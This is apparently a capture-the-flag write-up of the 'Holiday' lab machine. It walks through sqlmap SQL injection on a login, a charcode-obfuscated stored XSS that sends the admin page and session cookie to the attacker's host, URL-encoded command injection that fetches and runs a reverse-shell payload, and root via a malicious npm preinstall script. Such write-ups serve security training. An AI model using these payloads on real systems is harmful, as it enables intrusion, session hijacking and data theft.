## Holiday

### Lab Details 

- Difficulty: Hard
- Type: XSS, Command Injections, Priv Esc, Linux

#### Enumeration
- run `nmap`
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```
- test with generic endpoint we see that `/login` returns a login page
![[login page.png]]
- capture the request to `/login`
![[burpsuite capture request.png]]
- attempt to fuzzing endpoints with `ffuf` using `User-Agent` captured
```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.129.29.106:8000/FUZZ -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
<SNIP>
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 46ms]
js                      [Status: 301, Size: 163, Words: 7, Lines: 10, Duration: 49ms]
css                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 70ms]
logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 65ms]
img                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 68ms]
```
- we get `admin` endpoint
- capture the `burpsuite` request to `/login` endpoint with a login attempt and save it to a file
- try `sqli` with `sqlmap`
```bash
$ sqlmap -r ./login.post --level 5 --risk 3 --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:07:40 /2025-10-26/

[00:07:40] [INFO] parsing HTTP request from './login.post'
[00:07:40] [INFO] testing connection to the target URL
[00:07:40] [INFO] testing if the target URL content is stable
[00:07:41] [INFO] target URL content is stable
[00:07:41] [INFO] testing if POST parameter 'username' is dynamic
[00:07:41] [WARNING] POST parameter 'username' does not appear to be dynamic
[00:07:41] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[00:07:41] [INFO] testing for SQL injection on POST parameter 'username'
[00:07:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:07:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[00:07:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[00:07:43] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Invalid User")
[00:07:43] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[00:07:43] [INFO] testing 'Generic inline queries'
[00:07:43] [INFO] testing 'SQLite inline queries'
[00:07:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[00:07:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[00:07:43] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[00:07:43] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[00:08:20] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
[00:08:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:08:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:08:21] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[00:08:22] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[00:08:22] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[00:08:22] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[00:08:22] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[00:08:22] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[00:08:22] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[00:08:23] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[00:08:23] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[00:08:23] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[00:08:23] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 482 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=123") OR NOT 6166=6166 AND ("fhje"="fhje&password=123

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=123") OR 7536=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("fhFr"="fhFr&password=123
---
[00:08:24] [INFO] the back-end DBMS is SQLite
web application technology: Express
back-end DBMS: SQLite
[00:08:24] [INFO] fetched data logged to text files under '/home/ch4os1/.local/share/sqlmap/output/10.129.29.106'
[00:08:24] [WARNING] your sqlmap version is outdated

[*] ending @ 00:08:24 /2025-10-26/
```
- we get `username` field is inject-able 
- enumerate the database
- we see 5 tables 
```sql
[5 tables]
+-----------------+
| bookings        |
| notes           |
| sessions        |
| sqlite_sequence |
| users           |
+-----------------+
```
- check user table and we get the login to the site
```sql
Table: users
[1 entry]
+----+--------+----------------------------------+----------+
| id | active | password                         | username |
+----+--------+----------------------------------+----------+
| 1  | 1      | fdc8cd4cff2c19e0d1022e78481ddf36 | RickA    |
+----+--------+----------------------------------+----------+
```
- use `crackstation`, we get the plain text for hash `nevergonnagiveyouup`
- we are presented with the booking info 
![[bookings page.png]]
- click on a `UUID` of a booking
- we can add a note to a booking 
![[add note to booking.png]]
- and at the bottom of the `Add note` form, we get a text ` All notes must be approved by an administrator - this process can take up to 1 minute.`
#### Initial Foothold 
- from the text we get we might be able to perform some attack against the administrator 
- we can attempt to perform `xss` against the form
- attempt injecting `<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.16.56:8000/holiday.js"></script>');)</script>">` but got no response 
- attempt with base 10 `charcode` encoding using `cyberchef`
```js
## based 10 on cyber chef
<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,53,54,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>">
```
- we get a connection back on port 8000
```bash
$ nc -lvnp 80                                            
listening on [any] 80 ...
connect to [10.10.16.56] from (UNKNOWN) [10.129.29.106] 48518
GET /holiday.js HTTP/1.1
Accept: */*
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.56
```
- since that the referrer is made by `localhost` we can attempt to exploit this by first injecting `javascript` code into a file that we are letting admin to fetch from us 
- the code performs action on getting the page at `http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65` and post the response back to us 
- as we are wanting to fetch cookie from user
- refer to below code for `POC`
```js
//below code worked
var a = new XMLHttpRequest();
a.open("GET", "http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65", true);
a.onload = function() {
    var b = new XMLHttpRequest();
    b.open("POST", "http://10.10.16.56:8000/", true);
    b.setRequestHeader('Content-Type', 'text/plain'); // Try with text/plain, avoids CORS
    b.send(a.responseText);
};
a.send();
```
- we get the file back
```html
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.16.56] from (UNKNOWN) [10.129.29.106] 37282
POST / HTTP/1.1
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
Origin: http://localhost:8000
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Content-Type: text/plain
Accept: */*
Content-Length: 19304
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.56:8000

<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Booking Management</title>
      <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
      <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css" />
      <link rel="stylesheet" type="text/css" href="/css/main.min.css" />
      <script src="/js/jquery.min.js"></script>
      <script src="/js/bootstrap.min.js"></script>
  </head>

  <body>
      <div id="st-container" class="st-container">
      <div class="st-content">
          <p>
<SNIP>
                                    &lt;img src&#x3D;x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,53,54,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))&lt;/script&gt;&gt;<br/><br/>
                                    <small>Monday, October 27th 2025, 1:20:11 pm</small><br/>
                              <h2>Add note</h2>
                              <form class="form" action="/agent/addNote" method="post">
                                <input type="hidden" name="uuid" value="8dd841ff-3f44-4f2b-9324-9a833e2c6b65">
                                <textarea class="form-control" name="body"></textarea><br/>
                                <button class="btn btn-md btn-primary btn-block" type="submit">Add</button>
                              </form>
                              <br/>
                              <i>All notes must be approved by an administrator - this process can take up to 1 minute.</i>
                            </div>
                          </div>
                        </div>
                        <div role="tabpanel" class="tab-pane" id="admin">
                          <div class="panel panel-default">
                            <div class="panel-body">
                                <h2>Notes awaiting approval</h2>
                                    <hr/>
                                    <img src=x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,53,54,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>><br/><br/>
                                    <small>Monday, October 27th 2025, 1:25:01 pm</small><br/>
                                    <form action="/admin/approve" method="POST">
                                      <input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A5af8f150-b338-11f0-b086-bf3cecaed270.z02EfQGKuFK0e161%2FauiTQDRe%2Fg1CS2Ij0ojIW6xm0E">
                                      <input type="hidden" name="id" value="23">
                                      <button class="button" type="submit">Approve</button>
                                    </form>
                            </div>
                          </div>
                        </div>
                  </div>
              </div>


          </main>

      </div>
  </div>


  </body>
</html>
```
- we get the cookie value 
```js
name="cookie" value="connect.sid&#x3D;s%3A5af8f150-b338-11f0-b086-bf3cecaed270.z02EfQGKuFK0e161%2FauiTQDRe%2Fg1CS2Ij0ojIW6xm0E">
```
- hijack the cookie and we see `Admin` tab
![[admin cookie hijacking.png]]
- go to `/admin` endpoint and see `Bookings` and `Notes` tab 
- when clicking on them downloads two text files containing `booking` and `notes`
![[Hard/Holiday/admin dash.png]]
- capture the download request using `burpsuite` and attempt to perform command injection
- we get error with `;`
![[test chars.png]]
- error we get is `Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed`
- attempt with  `url encode`, lists the directory files
![[test chars bypass.png]]
- to exploit this my logic is first generate the `exf` payload using `msfvenom`
- then using `wget` to load the `reverse shell payload` to target while encoding the `ip address` to decimal
![[wget injection.png]]
- once we have loaded the reverse shell
- grant execution permission & invoke the shell
```js
//chmod 777 /home/algernon/app/payload 
GET /admin/export?table=notes%26chmod%20777%20/home/algernon/app/payload 
// home/algernon/app/payload
GET /admin/export?table=notes%26/home/algernon/app/payload
```
- we get a shell back as `algernon`
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.29.106] 43094
whoami
algernon
```
#### Lateral Movement (If any)

#### Privilege Escalation
- load and run `linpeas`
- found we have `sudo -l` right, need to get interactive shell first
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
Sudoers file: /etc/sudoers.d/algernon is readable
algernon ALL=(ALL) NOPASSWD: /usr/bin/npm i *
Sudoers file: /etc/sudoers.d/node_modules is readable
grep: /etc/sudoers.d/node_modules: Is a directory
```
- to exploit `npm` install with `sudo` right 
- first create a malicious page, im adding set user ID bit so we can run bash as root
```bash
algernon@holiday:/tmp/exploit-package$ cat package.json 
{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "chmod u+s /bin/bash"
  }
}
```
- then perform installation and we get access as root
```
algernon@holiday:/tmp/exploit-package$ sudo /usr/bin/npm i . --unsafe-perm


> evil-pkg@1.0.0 preinstall /tmp/exploit-package
> chmod u+s /bin/bash

npm WARN evil-pkg@1.0.0 No description
npm WARN evil-pkg@1.0.0 No repository field.
npm WARN evil-pkg@1.0.0 No license field.
algernon@holiday:/tmp/exploit-package$ 
algernon@holiday:/tmp/exploit-package$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
algernon@holiday:/tmp/exploit-package$ /bin/bash -p
bash-4.3# whoami
root
```
#### Resources

#### Lesson Learned
